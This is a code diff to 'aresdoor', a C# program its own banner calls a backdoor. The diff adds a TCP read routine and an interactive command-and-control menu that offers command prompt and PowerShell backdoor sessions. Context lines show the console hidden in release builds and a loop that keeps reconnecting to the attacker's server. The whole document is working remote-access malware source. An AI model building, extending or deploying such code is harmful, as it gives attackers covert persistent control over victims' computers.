@@ -89,13 +89,28 @@ namespace aresdoor
                 stream.Write(dataToSend, 0, dataToSend.Length); // Send data
 
                 return true; // if we got here then it worked!
-#if DEBUG
-            } catch (Exception exc)
-            { Console.WriteLine(exc.Message); return false; }
-#else
-            } catch (Exception)
-            { return false; }
-#endif
+            #if DEBUG
+                } catch (Exception exc)
+                { Console.WriteLine(exc.Message); return false; }
+            #else
+                } catch (Exception)
+                { return false; }
+            #endif
+        }
+
+        public string dataTravelFROM(NetworkStream stream)
+        {
+            int bytes = default(int);
+            byte[] tcpdata = new byte[256];
+
+            try { bytes = stream.Read(tcpdata, 0, tcpdata.Length); } // Read TCP data from stream
+            #if DEBUG
+                catch (Exception exc) { Console.WriteLine(exc.Message); }
+            #else
+                catch (Exception) { }
+            #endif
+
+            return System.Text.Encoding.ASCII.GetString(tcpdata, 0, bytes);
         }
     }
 
@@ -168,11 +183,11 @@ namespace aresdoor
              * 
              */
 
-#if !DEBUG
-            /* Hide console if debug mode is disabled. */
-            var handle = GetConsoleWindow();
-            ShowWindow(handle, SW_HIDE); // hide window
-#endif
+            #if !DEBUG
+                /* Hide console if debug mode is disabled. */
+                var handle = GetConsoleWindow();
+                ShowWindow(handle, SW_HIDE); // hide window
+            #endif
 
             /* Intercept command line arguments if any are found. */
             try
@@ -205,7 +220,7 @@ namespace aresdoor
             }
 
             /* Persistant backdoor connection */
-#if DEBUG
+            #if DEBUG
             while (true)
             {
                 if (Networking.checkInternetConn(server)) // Determine if the victim is able to connect to the attacker via DHCP (ping) request 
@@ -223,18 +238,41 @@ namespace aresdoor
                         while (true)
                         {
                             string aresdoorStartMenu = string.Empty;
+                            string responseFromServer = string.Empty;
+                            
                             aresdoorStartMenu += "+-------------------------------------------------------------+\n";
                             aresdoorStartMenu += "| Welcome to Aresdoor - a backdoor written by @BlackVikingPro |\n";
                             aresdoorStartMenu += "| Current Version: v1.2.1                                     |\n";
                             aresdoorStartMenu += "|                                                             |\n";
                             aresdoorStartMenu += "| C&C Menu Version: v1.0                                      |\n";
                             aresdoorStartMenu += "+-------------------------------------------------------------+\n";
-                            aresdoorStartMenu += "Please select an option below:\n";
+                            aresdoorStartMenu += "\nPlease select an option below:\n";
                             aresdoorStartMenu += " 1) Command Prompt Backdoor\n";
                             aresdoorStartMenu += " 2) Powershell Backdoor\n";
-                            aresdoorStartMenu += " 3) Exit\n";
+                            aresdoorStartMenu += " 3) Exit\n\n";
                             
-                            nc.dataTravelTO(stream, aresdoorStartMenu);
+                            nc.dataTravelTO(stream, "\n" + aresdoorStartMenu);
+
+                            optionInputDisplay: // Define a mark for requesting an option to be inputted
+                            nc.dataTravelTO(stream, "aresdoor> ");
+                            
+                            // Wait for a response
+                            responseFromServer = nc.dataTravelFROM(stream);
+                            responseFromServer = responseFromServer.Replace("\n", string.Empty).Replace(" ", string.Empty);
+
+                            if (responseFromServer == "1")
+                                nc.dataTravelTO(stream, "You've selected 'Command Prompt Backdoor'\n");
+                            else if (responseFromServer == "2")
+                                nc.dataTravelTO(stream, "You've selected 'Powershell Backdoor'\n");
+                            else if (responseFromServer == "3" || responseFromServer == "exit")
+                                nc.dataTravelTO(stream, "You've selected 'Exit'\n");
+                            else if (responseFromServer == "")
+                                goto optionInputDisplay;
+                            else
+                            {
+                                nc.dataTravelTO(stream, "Sorry, \"" + responseFromServer + "\" is not a recognized command.\n");
+                                goto optionInputDisplay;
+                            }
                         }
 
                         // sendBackdoor(server, port);
@@ -246,7 +284,7 @@ namespace aresdoor
                 { Console.WriteLine("Couldn't connect to {0}:{1}. Retrying in 5 seconds...", Networking.resolveHostName(server), port); }
                 System.Threading.Thread.Sleep(5000); // sleep for 5 seconds before retrying
             }
-#else
+            #else
             while (true)
             {
                 if (Networking.checkInternetConn(server)) // Determine if the victim is able to connect to the attacker via DHCP (ping) request 
@@ -259,7 +297,7 @@ namespace aresdoor
                 }
                 System.Threading.Thread.Sleep(5000); // sleep for 5 seconds before retrying
             }
-#endif
+            #endif
         }
 
         [System.Runtime.InteropServices.DllImport("kernel32.dll")]
